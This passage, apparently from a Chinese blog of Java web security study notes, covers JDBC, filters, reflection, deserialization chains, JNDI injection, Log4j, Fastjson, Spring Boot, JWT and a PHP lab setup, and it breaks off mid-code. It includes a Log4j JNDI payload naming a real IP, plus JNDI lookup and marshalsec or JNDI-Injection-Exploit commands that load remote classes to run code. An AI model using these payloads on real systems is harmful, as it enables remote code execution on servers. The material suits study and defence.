Applet的简称，意思为用Java编写的服务器端的程序,它运行在web服务器中**,它是作为来自**Web浏览器**或其他HTTP客户端的请求和**HTTP服务器**上的**数据库或应用程序**之间的**中间层**。</code></pre><p><strong>Servlet的作用：</strong></p><p><strong>1.接收用户发送的请求</strong></p><p><strong>2.调用其他的java程序来处理请求</strong></p><p><strong>3.根据处理结果，服务器将响应返回给客户端</strong></p><p>‍</p><p>‍</p><p>‍</p><h5 id="JDBC与数据库驱动"><a href="#JDBC与数据库驱动" class="headerlink" title="JDBC与数据库驱动"></a>JDBC与数据库驱动</h5><ul><li><p>JDBC(Java Database connectivity): 由java提供,用于访问数据库的统一API接口规范。原生态数据库开发：JDBC</p><p>参考： <a href="https://www.jianshu.com/p/ed1a59750127">JavaEE-JDBC基础</a></p></li><li><p>数据库驱动:</p><p>由各个数据库厂商提供,用于访问数据库的jar包(JDBC的具体实现),遵循JDBC接口,以便java程序员使用。</p></li><li><p>预编译sql注入问题</p><p>原理：<strong>提前编译好执行逻辑，你注入的语句不会改变原有逻辑</strong></p><p><img src="/assets/image-20240714111201-0cy59z4.png" alt="image">​</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 预编译写法</span><br><span class="hljs-title class_">String</span> safesql = <span class="hljs-string">&quot;SELECT * FROM news WHERE id=?&quot;</span>;<br><br><span class="hljs-comment">// 使用PreparedStatement</span><br><span class="hljs-title function_">try</span> (<span class="hljs-title class_">PreparedStatement</span> preparedStatement = connection.<span class="hljs-title function_">prepareStatement</span>(safesql)) &#123;<br>    <span class="hljs-comment">// 设置参数，防止SQL注入攻击</span><br>    preparedStatement.<span class="hljs-title function_">setInt</span>(<span class="hljs-number">1</span>, id);<br><br>    <span class="hljs-comment">// 执行查询</span><br>    <span class="hljs-title class_">ResultSet</span> resultSet = preparedStatement.<span class="hljs-title function_">executeQuery</span>();<br><br>    <span class="hljs-comment">// 处理结果集...</span><br>&#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">SQLException</span> e) &#123;<br>    e.<span class="hljs-title function_">printStackTrace</span>();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">预编译写法： safesql 是一个预编译的 <span class="hljs-variable constant_">SQL</span> 查询语句，其中 ? 是一个占位符，表示将在执行时动态替换。<br>使用 <span class="hljs-title class_">PreparedStatement</span>： <span class="hljs-title class_">PreparedStatement</span> 是 <span class="hljs-title class_">Statement</span> 的子接口，用于执行预编译的 <span class="hljs-variable constant_">SQL</span> 语句。通过调用 connection.<span class="hljs-title function_">prepareStatement</span>(safesql) 创建一个 <span class="hljs-title class_">PreparedStatement</span> 对象。<br>设置参数： 使用 setXXX 方法设置占位符的值。在这里，使用 <span class="hljs-title function_">setInt</span>(<span class="hljs-number">1</span>, id) 将 id 的值设置到第一个占位符上。这种方式防止了 <span class="hljs-variable constant_">SQL</span> 注入攻击，因为参数值是通过预编译的方式传递的，而不是通过直接拼接字符串。<br>执行查询： 调用 <span class="hljs-title function_">executeQuery</span>() 执行查询，得到 <span class="hljs-title class_">ResultSet</span> 对象。<br>处理结果集： 根据业务需要，处理查询结果集的数据。<br></code></pre></td></tr></table></figure></li></ul><p>‍</p><p>‍</p><p>‍</p><h5 id="过滤器-Filter-和监听器-Listener"><a href="#过滤器-Filter-和监听器-Listener" class="headerlink" title="过滤器(Filter)和监听器(Listener)"></a>过滤器(Filter)和监听器(Listener)</h5><p>原理图解：</p><p><img src="/assets/image-20240714171514-ilgf0pf.png" alt="image">​</p><ul><li><p>Filter(过滤器)</p><p><img src="/assets/image-20240714172521-mt14nwz.png" alt="image">​</p><p>参考：<a href="https://blog.csdn.net/GavinGroves/article/details/135834426?ops_request_misc=&request_id=&biz_id=102&utm_term=javaweb%20%E8%BF%87%E6%BB%A4%E5%99%A8&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-135834426.142%5Ev100%5Epc_search_result_base9&spm=1018.2226.3001.4187">JavaWeb过滤器 Filter</a></p></li><li><p>过滤器安全场景：Payload检测，权限访问控制，红队内存马植入，蓝队清理内存马等</p><p>过滤器实际上就是<strong>对Web资源进行拦截</strong>，做一些处理后再交给下一个过滤器或Servlet处理，<strong>通常都是用来拦截request</strong>进行处理的，也可以对返回的 response进行拦截处理。</p><p>开发人员利用filter技术，可以实现对所有Web资源的管理，例如实现权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。</p></li><li><p>Listener(监听器)</p><p><img src="/assets/image-20240714172442-56hudlm.png" alt="image">​</p><p>参考：<a href="https://blog.csdn.net/qq_52797170/article/details/124023760">JavaWeb监听器 Listener</a></p><p>监听器安全场景：代码审计中分析执行逻辑触发操作，红队内存马植入，蓝队清理内存马等</p><p>用途：</p><ul><li>用来监听ServletContext、HttpSession和ServletRequest等域对象的创建和销毁事件</li><li>用来监听域对象的属性发生修改的事件</li><li>可以在事件发生前、发生后做一些必要的处理</li></ul></li></ul><p>‍</p><p>‍</p><p>‍</p><h5 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h5><p>参考：<a href="https://xz.aliyun.com/t/9117">https://xz.aliyun.com/t/9117</a></p><p>什么是Java反射？</p><p>Java提供了一套反射API，该API由Class类与java.lang.reflect类库组成。<br>该类库包含了Field、Method、Constructor等类。对<a href="https://so.csdn.net/so/search?q=%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F&spm=1001.2101.3001.7020">成员变量</a>，成员方法和构造方法的信息进行的编程**&#x3D;&#x3D;操作&#x3D;&#x3D;**可以理解为反射机制。</p><p>‍</p><p>为什么要用到反射？</p><p>在运行时获得<strong>程序</strong>或<strong>程序集</strong>中每一个类型的<strong>成员和成员的信息</strong>，从而<strong>动态的创建、修改、调用、获取其属性</strong>，而<strong>不需要事先知道运行的对象是谁</strong>。划重点：<strong>在运行时而不是编译时</strong>。（<strong>不改变原有代码逻辑，自行运行的时候动态创建和编译即可</strong>）</p><p>‍</p><p>开发应用场景：<br>Spring框架的IOC基于反射创建对象和设置依赖属性。<br>SpringMVC的请求调用对应方法，也是通过反射。<br>JDBC的Class#forName(String className)方法，也是使用反射</p><p>‍</p><p>安全应用场景：</p><p>构造利用链，触发命令执行<br><a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>中的利用链构造<br>动态获取或执行任意类中的属性或方法<br>动态代理的底层原理是反射技术<br>rmi反序列化也涉及到反射操作</p><p>‍</p><h6 id="类反射调用"><a href="#类反射调用" class="headerlink" title="类反射调用"></a>类反射调用</h6><p><img src="/assets/image-20240714214903-mi09szx.png" alt="image">​</p><ol><li>Class对象类</li><li>Filed成员变量类</li><li>Method成员方法类</li><li>Constructor构造方法</li></ol><p>‍</p><h6 id="安全问题—反序列化利用链"><a href="#安全问题—反序列化利用链" class="headerlink" title="安全问题—反序列化利用链"></a>安全问题—反序列化利用链</h6><p>‍</p><p>‍</p><h5 id="Serializer"><a href="#Serializer" class="headerlink" title="Serializer"></a>Serializer</h5><p><img src="/assets/image-20240715001203-wk96msu.png" alt="image">​</p><h6 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h6><ul><li>序列化：将内存中的对象压缩成字节流</li><li>反序列化：将字节流转化成内存中的对象</li></ul><p>‍</p><p>序列化技术因何产生？</p><p><img src="/assets/image-20240715001828-aqcwxox.png" alt="image">​</p><ul><li><p>序列化与反序列化的设计就是用来传输数据的。</p></li><li><p>当两个进程进行通信的时候，可以通过序列化反序列化来进行传输。</p></li><li><p>能够实现数据的持久化，通过序列化可以把数据永久的保存在硬盘上，也可以理解为通过序列化将数据保存在文件中。</p></li></ul><p>‍</p><p>反序列化利用链</p><p>(1) 入口类的readObject直接调用危险方法<br>(2) 入口参数中包含可控类，该类有危险方法，readObject时调用<br>(3) 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用<br>(4) 构造函数&#x2F;静态代码块等类加载时隐式执行</p><p>‍</p><p>‍</p><h6 id="触发类"><a href="#触发类" class="headerlink" title="触发类"></a>触发类</h6><ul><li>JAVA内置的writeObject()&#x2F;readObject()</li><li>JAVA内置的XMLDecoder&#x2F;XMLEncoder()</li><li>XStream</li><li>SnakeYaml</li><li>FastJson</li><li>Jackson</li></ul><p>‍</p><h6 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h6><p>见环境复现</p><ul><li>重写方法</li><li>触发方法</li></ul><p>‍</p><p>‍</p><p>‍</p><h4 id="组件安全"><a href="#组件安全" class="headerlink" title="组件安全"></a>组件安全</h4><p>‍</p><h5 id="技术—项目管理"><a href="#技术—项目管理" class="headerlink" title="技术—项目管理"></a>技术—项目管理</h5><h6 id="Jar-仓库"><a href="#Jar-仓库" class="headerlink" title="Jar 仓库"></a>Jar 仓库</h6><p><a href="https://mvnrepository.com/">https://mvnrepository.com/</a></p><h6 id="Maven配置"><a href="#Maven配置" class="headerlink" title="Maven配置"></a>Maven配置</h6><p><a href="https://www.jb51.net/article/259780.htm">IDEA配置Maven的超详细步骤</a></p><p>‍</p><h6 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h6><pre><code class="hljs">     JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，通过名称等去找到相关的对象，并把它下载到客户端中来。用于在**分布式环境中查找和访问命名和目录服务**。它允许Java应用程序通过名称引用资源，如数据库连接、远程对象等。</code></pre><p>原理：通过其本身自带的rmi以及ldap这些api接口远程调用class文件实现注入</p><p>参考：<a href="https://blog.csdn.net/dupei/article/details/120534024">https://blog.csdn.net/dupei/article/details/120534024</a></p><p><img src="/assets/image-20240715233744-qu6wezv.png" alt="image">​</p><p>‍</p><h5 id="类别"><a href="#类别" class="headerlink" title="类别"></a>类别</h5><p>‍</p><h6 id="Log4j"><a href="#Log4j" class="headerlink" title="Log4j"></a>Log4j</h6><p>‍</p><p>Log4j是什么？</p><pre><code class="hljs">      是Apache为Java提供的**开源的日志管理工具**，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。</code></pre><p>‍</p><p>‍</p><p>Log4j中有三大组件：</p><p>日志器（Logger）、日志输出目标（Appender）、格式化器（Layout）</p><p>1、Logger：用来输出日志消息的类，它可以输出不同级别的消息，例如错误消息、警告消息等；</p><p>2、Appender；通常我们希望日志输出到文件中，以及控制台，也可能希望日志输出数据库，该类就表示一个输出的目标；</p><p>3、Layout：对输出的消息进行格式化，例如在消息中添加日期，以及级别等。</p><p>‍</p><p>‍</p><p><strong>Log4j 2.x 中的 JNDI 注入漏洞LDAP</strong>，允许攻击者通过特制的日志消息进行远程代码执行。在这种情况下，攻击者可以利用<strong>恶意构造的 JNDI上下文注入</strong>，<strong>执行恶意的Java代码。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">上下文注入：<br>- 在某些情况下，应用程序会通过用户提供的数据构建 JNDI 上下文（InitialContext）。<br>- 如果应用程序在构建上下文时没有充分验证和过滤用户提供的数据，攻击者可能会尝试通过构造特殊的输入来注入恶意的 JNDI 对象。如：$&#123;jndi:ldap:<span class="hljs-comment">//47.94.236.117:1389/uyhyw6&#125;</span><br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><h6 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h6><p>参考：<a href="https://juejin.cn/post/7231197051203207227">Fastjson：快速、简单、可靠的Java JSON处理库 - 掘金 (juejin.cn)</a></p><p>‍</p><p>‍</p><p>Fastjson是什么？</p><p>Fastjson是一个Java语言编写的高性能JSON处理库，可以将 Java 对象转换为 JSON 格式（序列化），当然它也可以将 JSON 字符串转换为 Java 对象（反序列化）。</p><p>Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。</p><p>‍</p><p>‍</p><p>FastJson JNDI 注入漏洞（JSON ）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1.</span> FastJson 在解析 JSON 数据时，会将 JSON 字符串转换为 Java 对象。<br><span class="hljs-number">2.</span> 攻击者可以通过构造恶意的 JSON 字符串，包含特殊的 JSON 注释和 FastJson 的特性，来触发漏洞。<br><span class="hljs-number">3.</span> 攻击者构造的 JSON 数据可能包含特殊的注释和 FastJson 的特性，以触发漏洞并执行恶意代码。<br><span class="hljs-number">4.</span> 远程代码执行：由于漏洞存在，攻击者可能成功执行远程代码，导致服务器上的不安全操作。<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/guo15890025019/article/details/120532891">Fastjson漏洞复现_fastjson 1.2.84-CSDN博客</a></p><p>‍</p><h5 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h5><h6 id="引用漏洞版本"><a href="#引用漏洞版本" class="headerlink" title="引用漏洞版本"></a>引用漏洞版本</h6><h6 id="使用触发漏洞"><a href="#使用触发漏洞" class="headerlink" title="使用触发漏洞"></a>使用触发漏洞</h6><p>‍</p><p>‍</p><p>‍</p><h4 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h4><p>‍</p><p>‍</p><h5 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h5><p><img src="/assets/image-20240717103407-os8urbo.png" alt="image">​</p><h6 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h6><p>什么是jndi注入<br>为什么有jndi注入<br>JDNI注入安全问题<br>JDNI注入利用条件<br>参考：<a href="https://blog.csdn.net/dupei/article/details/120534024">https://blog.csdn.net/dupei/article/details/120534024</a></p><p>‍</p><pre><code class="hljs">         JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。</code></pre><ul><li><p>RMI：远程方法调用注册表</p></li><li><p>LDAP：轻量级目录访问协议</p></li></ul><p>‍</p><p>‍</p><h5 id="利用-限制"><a href="#利用-限制" class="headerlink" title="利用&amp;限制"></a>利用&amp;限制</h5><blockquote><p>调用检索：<br>Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。javax.naming.InitialContext.lookup()</p><p>lookup()：通过名字检索执行的对象</p><p>‍</p><p>在RMI服务中调用了InitialContext.lookup()的类有：</p><ul><li><p>org.springframework.transaction.jta.JtaTransactionManager.readObject()</p></li><li><p>com.sun.rowset.JdbcRowSetImpl.execute()</p></li><li><p>javax.management.remote.rmi.RMIConnector.connect()</p></li><li><p>org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)</p></li></ul><p>‍</p><p>在LDAP服务中调用了InitialContext.lookup()的类有：</p><ul><li><p>InitialDirContext.lookup()</p></li><li><p>Spring LdapTemplate.lookup()</p></li><li><p>LdapTemplate.lookupContext()</p></li></ul></blockquote><p>‍</p><ul><li><p>JNDI远程调用-JNDI-Injection(下述详细过程见环境复现)</p><blockquote><p>基于工具自主定义<br>1、使用远程调用(默认端口1389)<br>调用rmi ldap等服务对象类，远程地址的一个class文件被执行<br>​<code>new InitialContext().lookup(&quot;ldap://xx.xx.xx.xx:1389/Test&quot;);</code>​<br>​<code>new InitialContext().lookup(&quot;rmi://xx.xx.xx.xx:1099/Test&quot;);</code>​<br>2、使用利用工具生成调用地址<br>创建一个rmi ldap等服务调用 实例化<br>​<code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot; -A xx.xx.xx.xx</code>​</p></blockquote></li><li><p>JNDI远程调用-marshalsec(此工具有绕过jdk高版本的能力，但是不多)</p><blockquote><p>1 、使用远程调用 ( 默认端口 1389 )<br>​<code>new InitialContext().lookup(&quot;ldap://xx.xx.xx.xx:1389/Test&quot;);</code>​<br>​<code>new InitialContext().lookup(&quot;rmi://xx.xx.xx.xx:1099/Test&quot;);</code>​<br>2、编译调用对象<br>​<code>javac Test.java</code>​<br>3、使用利用工具生成调用协议（rmi,ldap）<br>​<code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://0.0.0.0/#Test</code>​<br>​<code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://0.0.0.0/#Test</code>​<br>4、将生成的Class存放访问路径</p></blockquote></li><li><p>JNDI注入-FastJson漏洞结合</p><blockquote><p>背景：JavaEE 中接受用户提交的 JSON 数据进行转换 (FastJson 反序列化漏洞)<br>思路：利用 <code>InitialContext.lookup ()</code>​ 中的进行 <code>JdbcRowSetImpl</code>​ 类 JNDI 服务注入<br>漏洞利用 <code>FastJson autotype</code>​ 处理 Json 对象的时候，未对 @type 字段进行完整的安全性验证，攻击者可以传入危险类，并调用危险类连接远程 RMI 主机，通过其中的恶意类执行代码。攻击者通过这种方式可以实现远程代码执行漏洞，获取服务器敏感信息，甚至可以利用此漏洞进一步的对服务器数据进行操作。</p></blockquote></li></ul><p><img src="/assets/image-20240717110159-f3gm6de.png" alt="image">​</p><p>‍</p><h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><ul><li>marshalsec</li><li>JNDI-Injection</li></ul><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h4 id="框架类-SpringBoot"><a href="#框架类-SpringBoot" class="headerlink" title="框架类-SpringBoot"></a>框架类-SpringBoot</h4><pre><code class="hljs">    Spring Boot是由Pivotal团队提供的一套开源框架，可以简化spring应用的创建及部署。它提供了丰富的Spring模块化支持，可以帮助开发者更轻松快捷地构建出企业级应用。Spring Boot通过自动配置功能，降低了复杂性，同时支持基于JVM的多种开源框架，可以缩短开发时间，使开发更加简单和高效。</code></pre><p>参考：<a href="https://springdoc.cn/spring-boot/">Spring Boot 中文文档 (springdoc.cn)</a></p><p>‍</p><h5 id="原生"><a href="#原生" class="headerlink" title="原生"></a>原生</h5><p>‍</p><h6 id="路由响应"><a href="#路由响应" class="headerlink" title="路由响应"></a>路由响应</h6><ul><li><p>数据响应</p><p><code>@Controller</code>​ 通常用于标识传统的<strong>MVC控制器</strong>，而 <code>@RestController</code>​ 更适用于RESTful风格的控制器。</p></li><li><p><code>@ResponseBody</code>​ 表示方法的<strong>返回值</strong>将直接作为HTTP响应体返回给客户端。</p><p><code>@RestController</code>​（自带回显）注解用于标识一个类是RESTful风格的控制器，它包含了 <code>@ResponseBody</code>​ 和 <code>@Controller</code>​ 的功能。</p></li><li><p>参数传递</p><p><code>@RequestParam</code>​注解用于从HTTP请求中提取参数，使得控制器方法可以访问并使用这些参数。</p></li><li><p>路由映射</p><p><code>@RequestMapping</code>​，<code>@GetMapping</code>​和<code>@PostMapping</code>​注解用于定义HTTP请求的映射路径。</p></li></ul><p>‍</p><h6 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h6><p>参考：</p><p><a href="https://blog.csdn.net/m0_52514893/article/details/135189009?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172129560516800222863206%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172129560516800222863206&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-135189009-null-null.142%5Ev100%5Epc_search_result_base4&utm_term=java%20Mybatis&spm=1018.2226.3001.4187">Java经典框架之MyBatis_java mybatis-CSDN博客</a></p><p><a href="https://juejin.cn/post/7201831345415749692">MyBatis教程（看这一篇就够了）入门到精通 - 掘金 (juejin.cn)</a></p><p>SQL三种不安全写法</p><ol><li><code>&#39;%#&#123;title&#125;%</code>​</li><li><code>in (#&#123;ids&#125;)</code>​</li><li><code>order by</code>​之后</li></ol><p>‍</p><p>‍</p><p>‍</p><h6 id="JWT—身份鉴权"><a href="#JWT—身份鉴权" class="headerlink" title="JWT—身份鉴权"></a>JWT—身份鉴权</h6><ul><li><p>JWT ( JSON  Web Token ) 是由服务端用加密算法对信息签名来保证其完整性和不可伪造；</p></li><li><p>Token里可以包含所有必要信息，这样服务端就无需保存任何关于用户或会话的信息；</p></li><li><p>JWT用于身份认证、会话维持等。由三部分<strong>组成</strong>，header、payload与signature。</p><p>JWT 是由这三个部分组成的字符串，<strong>格式</strong>形如 <code>header.payload.signature</code>​</p><ul><li><p><strong>Header（头部）：</strong>  JWT 的头部通常包含两部分信息：<strong>声明类型（typ）和使用的签名算法（alg）</strong> 。这些信息以 JSON 格式存在，然后进行 Base64 编码，形成 JWT 的第一个部分。头部用于描述关于该 JWT 的元数据信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>  <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;HS256&quot;</span>,<br>  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>Payload（负载）：</strong>  JWT 的负载包含有关 <strong>JWT 主题（subject）及其它声明的信息</strong>。与头部一样，负载也是以 JSON 格式存在，然后进行 Base64 编码，形成 JWT 的第二个部分。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>  <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;1234567890&quot;</span>,<br>  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;John Doe&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1516239022</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>Signature（签名）：</strong>  JWT 的签名是由<strong>头部、负载以及一个密钥生成的</strong>，用于验证 JWT 的真实性和完整性。签名是由指定的签名算法对经过 Base64 编码的头部和负载组合而成的字符串进行签名生成的。</p><p>例如，使用 HMAC SHA-256 算法生成签名：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">HMACSHA256(<br>  base64UrlEncode(header) + <span class="hljs-string">&quot;.&quot;</span> +<br>  base64UrlEncode(payload),<br>  secret<br>)<br></code></pre></td></tr></table></figure></li></ul></li></ul><p><img src="/assets/image-20240718174543-ed9t1pd.png" alt="image">​</p><p>服务器只负责token创建和验证功能，没有储存所以可以有效规避CSRF漏洞的产生</p><p>安全问题：密匙泄露，加密NONE，CVE漏洞</p><p>参考：<a href="https://cloud.tencent.com/developer/article/1802761">安全攻防 | JWT认知与攻击-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p>‍</p><p>‍</p><p>‍</p><h5 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h5><p>‍</p><h6 id="模板Thymeleaf"><a href="#模板Thymeleaf" class="headerlink" title="模板Thymeleaf"></a>模板Thymeleaf</h6><ul><li>原生开发-不安全写法-SSTI注入</li><li>原生开发-库本身漏洞-CVE</li></ul><p>参考：<a href="https://mp.weixin.qq.com/s/NueP4ohS2vSeRCdx4A7yOg">thymeleaf模板注入学习与研究–查找与防御 (qq.com)</a></p><p>‍</p><p>‍</p><h5 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h5><p>‍</p><h6 id="Actuator"><a href="#Actuator" class="headerlink" title="Actuator"></a>Actuator</h6><ul><li><p>概念</p><p>框架自带的监控组件，用来分析项目</p><p>Actutor断点图</p><p><img src="/assets/image-20240718002707-p1mv3n3.png" alt="image">​</p></li><li><p>监控系统</p><p>heapdump泄露利用</p><p>本身泄露类上漏洞利用cve</p></li></ul><p>‍</p><h6 id="Swagger"><a href="#Swagger" class="headerlink" title="Swagger"></a>Swagger</h6><ul><li><p>概念</p><p>Swagger是当下比较流行的实时接口文文档生成工具。接口文档是当前前后端分离项目中必不可少的工具，在前后端开发之前，后端要先出接口文档，前端根据接口文档来进行项目的开发，&#x3D;&#x3D;<strong>双方开发结束后在进行联调测试。</strong>&#x3D;&#x3D;</p><p>方便项目人员对项目的各种API接口的测试</p><p>参考：<a href="https://blog.csdn.net/lsqingfeng/article/details/123678701">SpringBoot教程(十六) | SpringBoot集成swagger（全网最全）_springboot swagger-CSDN博客</a></p></li><li><p>接口系统</p><p>自动化测试(发现更多应用的接口数据)</p><p>后续讲到联动Burp Xray等进行全自动分析</p></li></ul><p>‍</p><p>‍</p><h5 id="Springboot部署"><a href="#Springboot部署" class="headerlink" title="Springboot部署"></a>Springboot部署</h5><p>这里只讲最简单的打包方式，不涉及源码脱壳打包那些</p><p>打包部署-JAR&amp;WAR</p><p>详细步骤见环境复现</p><p>‍</p><p>‍</p><h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>‍</p><h3 id="PHP应用-留言板功能-超全局变量-数据库操作-第三方插件引用"><a href="#PHP应用-留言板功能-超全局变量-数据库操作-第三方插件引用" class="headerlink" title="PHP应用&amp;留言板功能&amp;超全局变量&amp;数据库操作&amp;第三方插件引用"></a>PHP应用&amp;留言板功能&amp;超全局变量&amp;数据库操作&amp;第三方插件引用</h3><ol><li><p>数据导入-mysql架构&amp;库表列</p><p> 打开phpstudy</p><p> <img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-06-27%20174105-20240627174452-m8qytoc.png" alt="屏幕截图 2024-06-27 174105">​</p><p> 使用Navicat创建数据库并设置规则</p><p> <img src="/assets/image-20240627174840-7wfflk6.png" alt="image">​</p><p> 新建表</p><p> <img src="/assets/image-20240627175205-pod655p.png" alt="image">​</p><p> 保存表名为gbook</p><p> <img src="/assets/image-20240627175305-fpa663k.png" alt="image">​</p><p> 使用phpstorm创建新项目</p><p> <img src="/assets/image-20240627175417-2hoku68.png" alt="image">​</p><p> 编写代码后显示效果</p><p> <img src="/assets/image-20240627181235-iembxtv.png" alt="image">​</p><p> 连接数据库查看效果</p><p> <img src="/assets/image-20240627182312-njpp84u.png" alt="image">​</p></li><li><p>数据库操作-mysqli函数&amp;增删改查</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//数据库通信</span><br><span class="hljs-variable">$dbip</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$dbpass</span> = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&#x27;dome01&#x27;</span>;   <span class="hljs-comment">//固定这四个地址</span><br><br><span class="hljs-comment">//使用该函数来与数据库建立连接</span><br><span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-variable">$dbip</span>,<span class="hljs-variable">$dbuser</span>,<span class="hljs-variable">$dbpass</span>,<span class="hljs-variable">$dbname</span>);<br><br><span class="hljs-comment">//判断是否连接成功</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$con</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接错误：&quot;</span> .<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());      <span class="hljs-comment">//如果错误就提示，正确不提示</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$u</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];  <span 